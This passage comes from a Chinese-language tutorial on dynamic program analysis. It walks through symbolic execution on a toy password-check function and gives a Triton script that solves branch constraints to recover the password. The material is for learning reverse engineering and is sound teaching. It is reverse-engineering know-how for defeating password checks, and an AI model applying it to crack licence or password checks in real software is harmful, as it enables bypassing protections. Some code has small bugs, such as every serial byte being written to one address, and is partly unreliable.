p7 = _serial
p8 = p1
p9 = *(add(p7,p8))
p10 = 1
p11 = p1
p12 = add(p11,1)
p13 = p12
p14 = p0
p15 = p13
p16 = *(add(p14,p15))
p17 = sub(p16,1)
p18 = xor(p17,0x55)
p19 = _serial
p20 = p13
p21 = *(add(p19,p20))

Register Reference Table :

RAX : p19
RBX : -1
RCX : p20
RDX : p18
RSI : p21
RDI : (control)

Memory Reference Table :

var_4          : p10
var_14         : p13
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

</code></pre>
<p>在第二轮循环里面,可以看到var_14 经过了一次循环之后进行了自增,读取input_buffer 和_serial_buffer 的下一个内容.然后我们对第二轮循环进行约束条件构造</p>
<pre><code class="language-txt">
(RDX == RSI) =&gt; (p21 == p18) =&gt; (xor(sub(*(add(p0,p13)),1),0x55) == (*(add(_serial,p13)))) =&gt; (xor(sub(*(add(rdi,add(p11,1))),1),0x55) == (*(add(_serial,add(p11,1))))) =&gt; (xor(sub(*(add(rdi,add(p1,1))),1),0x55) == (*(add(_serial,add(p1,1))))) =&gt; (xor(sub(*(add(rdi,add(0,1))),1),0x55) == (*(add(_serial,add(0,1)))))

</code></pre>
<p>rdi 指向的是input_buffer 的缓冲区地址,那么通过符号执行现在可以计算出要读的缓存位置就是add(0,1) = 1 .我们继续精简约束:</p>
<pre><code class="language-txt">
(RDX == RSI) =&gt; (xor(sub(*(add(rdi,add(0,1))),1),0x55) == (*(add(_serial,add(0,1))))) =&gt; (xor(sub(X2,1),0x55) == (0x3E))

</code></pre>
<p>经过上面对寄存器和内存的布局分析理解静态符号执行的原理之后.接下来我们来思考一个问题,如何对我们希望执行的条件分支进行约束判断呢?我们继续回来阅读测试代码:</p>
<pre><code class="language-c">
char *serial = &quot;\x31\x3e\x3d\x26\x31&quot;;

int check_password(char *ptr)
{
  int i = 0;
  while (i &lt; 5){
    if (((ptr[i] - 1) ^ 0x55) != serial[i])
      return 1; /* bad password */
    i++;
  }
  return 0; /* good password */
}

</code></pre>
<p>注意代码中的if 判断,如果ptr 中的内容经过异或之后不符合结果,那就自动退出程序执行,所以我们寻求ptr 中唯一正确解的字符串内容,关键的要点就是要对<code>cmp edx,esi</code> 进行检验.</p>
<pre><code class="language-txt">
0x0100000F2F:    cmp     [rbp+var_14], 5
0x0100000F33:    jge     loc_100000F7C      &lt;-  The condition of for check ..
                 ;  ...
0x0100000F5A:    cmp     edx, esi           &lt;-  Check Condition ..
0x0100000F5C:    jz      loc_100000F6E      &lt;-  is equal
0x0100000F62:    mov     [rbp+var_4], 1
0x0100000F69:    jmp     loc_100000F83      &lt;-  not equal than return
0x0100000F6E:    mov     eax, [rbp+var_14]
0x0100000F71:    add     eax, 1
0x0100000F74:    mov     [rbp+var_14], eax
0x0100000F77:    jmp     loc_100000F2F      &lt;-  Jump to for condition check ..
0x0100000F7C:    mov     [rbp+var_4], 0
0x0100000F83:    mov     eax, [rbp+var_4]   &lt;-  Get Return Value
0x0100000F86:    pop     rbp
0x0100000F87:    retn

</code></pre>
<p><code>cmp edx,esi</code> 对边edx 和esi 的值,然后根据两者相等来判断是否要进行跳转到地址0x100000F6E ,接下来我们希望要在0x0100000F5A 这里设置断点计算推出edx 适合条件判断的值应该怎么操作呢?这就需要引入动态符号执行,我们以动态符号执行引擎Triton 为例子编写一个Fuzzing 脚本,这个脚本的原理是通过在<code>cmp edx,esi</code> 中进行求解得出输入缓冲区的内存:</p>
<pre><code class="language-python">
from triton import TritonContext, ARCH, Instruction, MemoryAccess, CPUSIZE, MODE


function_code = {                                  #   &lt;serial&gt; function
    0x100000F20 : '\x55' ,                         #  push    rbp
    0x100000F21 : '\x48\x89\xe5' ,                 #  mov     rbp, rsp
    0x100000F24 : '\x48\x89\x7d\xf0' ,             #  mov     [rbp+var_10], rdi
    0x100000F28 : '\xc7\x45\xec\x00\x00\x00\x00' , #  mov     [rbp+var_14], 0
    0x100000F2F : '\x83\x7d\xec\x05' ,             #  cmp     [rbp+var_14], 5
    0x100000F33 : '\x0f\x8d\x43\x00\x00\x00' ,     #  jge     loc_100000F7C
    0x100000F39 : '\x48\x8b\x45\xf0' ,             #  mov     rax, [rbp+var_10]
    0x100000F3D : '\x48\x63\x4d\xec' ,             #  movsxd  rcx, [rbp+var_14]
    0x100000F41 : '\x0f\xbe\x14\x08' ,             #  movsx   edx, byte ptr [rax+rcx]
    0x100000F45 : '\x83\xea\x01' ,                 #  sub     edx, 1
    0x100000F48 : '\x83\xf2\x55' ,                 #  xor     edx, 55h
    0x100000F4B : '\x48\x8b\x05\xae\x00\x00\x00' , #  mov     rax, cs:_serial
    0x100000F52 : '\x48\x63\x4d\xec' ,             #  movsxd  rcx, [rbp+var_14]
    0x100000F56 : '\x0f\xbe\x34\x08' ,             #  movsx   esi, byte ptr [rax+rcx]
    0x100000F5A : '\x39\xf2' ,                     #  cmp     edx, esi
    0x100000F5C : '\x0f\x84\x0c\x00\x00\x00' ,     #  jz      loc_100000F6E
    0x100000F62 : '\xc7\x45\xfc\x01\x00\x00\x00' , #  mov     [rbp+var_4], 1
    0x100000F69 : '\xe9\x15\x00\x00\x00' ,         #  jmp     loc_100000F8
    0x100000F6E : '\x8b\x45\xec' ,                 #  mov     eax, [rbp+var_14]
    0x100000F71 : '\x83\xc0\x01' ,                 #  add     eax, 1
    0x100000F74 : '\x89\x45\xec' ,                 #  mov     [rbp+var_14], eax
    0x100000F77 : '\xe9\xb3\xff\xff\xff' ,         #  jmp     loc_100000F2F
    0x100000F7C : '\xc7\x45\xfc\x00\x00\x00\x00' , #  mov     [rbp+var_4], 0
    0x100000F83 : '\x8b\x45\xfc' ,                 #  mov     eax, [rbp+var_4]
    0x100000F86 : '\x5d' ,                         #  pop     rbp
    0x100000F87 : '\xc3' ,                         #  retn
}

Triton = TritonContext()

Triton.setArchitecture(ARCH.X86_64)
Triton.enableMode(MODE.ALIGNED_MEMORY, True)


def run(eip_address) :
    while eip_address in function_code :
        #print 'Current Address:',hex(eip_address)
        instruction_data = Instruction()

        instruction_data.setOpcode(function_code[eip_address])
        instruction_data.setAddress(eip_address)

        Triton.processing(instruction_data)

        eip_address = Triton.getRegisterAst(Triton.registers.rip).evaluate()

def init_context(input_data) :
    Triton.concretizeAllRegister()  #  clean register record
    Triton.concretizeAllMemory()    #  clean memory record

    for input_data_address,input_data_value in input_data.items() :
        Triton.setConcreteMemoryValue(input_data_address,input_data_value)  #  input data buffer .
        Triton.convertMemoryToSymbolicVariable(MemoryAccess(input_data_address, CPUSIZE.BYTE))
        Triton.convertMemoryToSymbolicVariable(MemoryAccess(input_data_address+1, CPUSIZE.BYTE))

    Triton.setConcreteMemoryValue(0x100001000, 0x31)  #  Setting data for global data string .
    Triton.setConcreteMemoryValue(0x100001000, 0x3e)
    Triton.setConcreteMemoryValue(0x100001000, 0x3d)
    Triton.setConcreteMemoryValue(0x100001000, 0x26)
    Triton.setConcreteMemoryValue(0x100001000, 0x31)

    Triton.setConcreteRegisterValue(Triton.registers.rdi, 0x1000)  #  RDI is input buffer .
    Triton.setConcreteRegisterValue(Triton.registers.rsp, 0x7fffffff)
    Triton.setConcreteRegisterValue(Triton.registers.rbp, 0x7fffffff)

def get_path() :
    code_stream_record_list = Triton.getPathConstraints()
    ast_context = Triton.getAstContext()
    last_branch = ast_context.equal(ast_context.bvtrue(),ast_context.bvtrue())
    make_input_data = []

    for code_stream_record_index in code_stream_record_list :
        if not code_stream_record_index.isMultipleBranches() :
            continue

        branch_list = code_stream_record_index.getBranchConstraints()

        for branch_index in branch_list :
            if branch_index['isTaken'] :
                continue

            models = Triton.getModel(ast_context.land([last_branch,branch_index['constraint']]))
            print models

            if len(models) == 1 :
                if models.values()[0].getValue() == 0 :
                    continue

            temp_data = {}

            for models_address_index,models_value_index in models.items() :
                symblo = Triton.getSymbolicVariableFromId(models_address_index)
                temp_data[symblo.getOrigin()] = models_value_index.getValue()

            make_input_data.append(temp_data)

        last_branch = ast_context.land([last_branch,code_stream_record_index.getTakenPathConstraintAst()])

    Triton.clearPathConstraints()

    return make_input_data


if __name__ == '__main__' :
    history_data = []
    try_list = [{0x1000:0x00}]

    while try_list :
        print '----'
        history_data.append(try_list[0])
        print 'Try input &gt;&gt;&gt;',try_list[0]

        init_context(try_list[0])  #  init Triton Execute Context .
        run(0x100000F20)           #  try execute

        del try_list[0]

        make_input_data = get_path()  #  calculate path

        for make_input_data_index in make_input_data :
            if make_input_data_index in try_list or make_input_data_index in history_data :
                continue

            try_list.append(make_input_data_index)

</code></pre>
<p>程序运行结果如下:</p>
<p><img src="7.dynamic-analysis/%E5%8A%A8%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic7/pic4.png" alt="" /></p>
<p>现在回来对代码进行分析,我们看到下面的代码:</p>
<pre><code class="language-python">
def init_context(input_data) :
    Triton.concretizeAllRegister()  #  clean register record
    Triton.concretizeAllMemory()    #  clean memory record

</code></pre>
<p>在Triton 尝试符号执行时首先要把寄存器布局和内存布局的记录全部清空,然后再对内存进行初始值的设定:</p>
<pre><code class="language-python">
    #  设置输入内存的值
    for input_data_address,input_data_value in input_data.items() :
        Triton.setConcreteMemoryValue(input_data_address,input_data_value)  #  input data buffer .
        Triton.convertMemoryToSymbolicVariable(MemoryAccess(input_data_address, CPUSIZE.BYTE))
        Triton.convertMemoryToSymbolicVariable(MemoryAccess(input_data_address+1, CPUSIZE.BYTE))

    #  设置_serial_buffer 的值
    Triton.setConcreteMemoryValue(0x100001000, 0x31)  #  Setting data for global data string .
    Triton.setConcreteMemoryValue(0x100001000, 0x3e)
    Triton.setConcreteMemoryValue(0x100001000, 0x3d)
    Triton.setConcreteMemoryValue(0x100001000, 0x26)
    Triton.setConcreteMemoryValue(0x100001000, 0x31)

    #  初始化寄存器的值
    Triton.setConcreteRegisterValue(Triton.registers.rdi, 0x1000)  #  RDI is input buffer .
    Triton.setConcreteRegisterValue(Triton.registers.rsp, 0x7fffffff)
    Triton.setConcreteRegisterValue(Triton.registers.rbp, 0x7fffffff)

</code></pre>
<p>初始值设置完成之后,接下来就调用<code>run()</code> 执行分析:</p>
<pre><code class="language-python">
def run(eip_address) :
    while eip_address in function_code :
        #print 'Current Address:',hex(eip_address)
        instruction_data = Instruction()

        instruction_data.setOpcode(function_code[eip_address])
        instruction_data.setAddress(eip_address)

        Triton.processing(instruction_data)

        eip_address = Triton.getRegisterAst(Triton.registers.rip).evaluate()  #  执行指令并获取下一个跳转地址

</code></pre>
<p><code>get_path()</code> 则是我们对程序判断(<code>cmp edx,esi</code>) 的求解过程,精简<code>get_path()</code> 的原理如下:</p>
<pre><code class="language-python">

def get_path() :
    code_stream_record_list = Triton.getPathConstraints()  #  获取程序执行的全部符号执行结果
    ast_context = Triton.getAstContext()

    for code_stream_record_index in code_stream_record_list :
        if not code_stream_record_index.isMultipleBranches() :  #  判断是不是多分支结构
            continue

        branch_list = code_stream_record_index.getBranchConstraints()  #  获取分析内容

        for branch_index in branch_list :
            models = Triton.getModel(ast_context.land([last_branch,branch_index['constraint']]))  #  对分支进行求解

            for models_address_index,models_value_index in models.items() :  #  获取求解数据
                symblo = Triton.getSymbolicVariableFromId(models_address_index)
                temp_data[symblo.getOrigin()] = models_value_index.getValue()

        last_branch = ast_context.land([last_branch,code_stream_record_index.getTakenPathConstraintAst()])

    Triton.clearPathConstraints()  #  清除所有执行记录

</code></pre>
<p>我们输出<code>get_path()</code> 执行的内容看看:</p>
<p><img src="7.dynamic-analysis/%E5%8A%A8%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic7/pic5.png" alt="" /></p>
<p>可以看到,输出的内容是经过优化之后的SMT 表达式,z3 最后根据这些表达试来求解出对应的结果.</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">

            </nav>

        </div>

        <!-- Livereload script (if served using the cli tool) -->
        <script>
            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
            const socket = new WebSocket(wsAddress);
            socket.onmessage = function (event) {
                if (event.data === "reload") {
                    socket.close();
                    location.reload();
                }
            };

            window.onbeforeunload = function() {
                socket.close();
            }
        </script>



        <script>
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr.min.js"></script>
        <script src="mark.min.js"></script>
        <script src="searcher.js"></script>

        <script src="clipboard.min.js"></script>
        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS scripts -->
        <script src="theme/pagetoc.js"></script>

        <script>
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>

    </div>
    </body>
</html>
